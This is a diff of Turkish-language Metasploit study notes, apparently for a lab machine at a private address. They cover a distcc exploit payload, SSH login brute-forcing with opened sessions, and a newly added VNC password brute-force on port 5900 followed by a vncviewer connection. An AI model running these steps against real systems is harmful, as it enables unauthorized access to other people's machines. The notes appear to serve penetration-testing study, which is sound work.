@@ -196,7 +196,7 @@ msf6> exploit(unix/misc/distcc_exec)~ set payload 5 //hepsini olana kadar dene 1
 
 diye devam et
 
-**_SSH-Login Hackleme _**
+4. -- SSH-Login Hackleme --
 
 ~msfconsole
 msf6> ~search ssh
@@ -211,3 +211,18 @@ msf6 auxiliary (sc..../ssh_login)> ~exploit //hacklemeye başlar
 msf6 auxiliary (sc..../ssh_login)> ~sessions -l
 msf6 auxiliary (sc..../ssh_login)> ~sessions 1
 uname -a ...
+
+5. --VNC ile Hacklemek-- 5900 port
+
+- VNC (Virtual Network Computing): Bir bilgisayarı uzaktan görsel arayüzüyle kontrol etmeyi sağlayan teknolojidir. Her zaman açık değildir bu port
+
+~msfconsole
+msf6> ~search ssh
+msf6> ~use auxiliary/sc..../vnc_login //login olanı cp
+msf6 auxiliary (sc..../vnc_login)> ~show options //required yes olanlar zorunlu. Password kısmına wordlist ekle.
+msf6 auxiliary (sc..../vnc_login)> ~exploit //hacklemeye başlar. bulduğunda password görünür
+
+yeni terminal
+~vncviewer
+~vncviewer 10.0.2.12
+password: //bulunan password girilir. Arayüzlü terminal çıkar
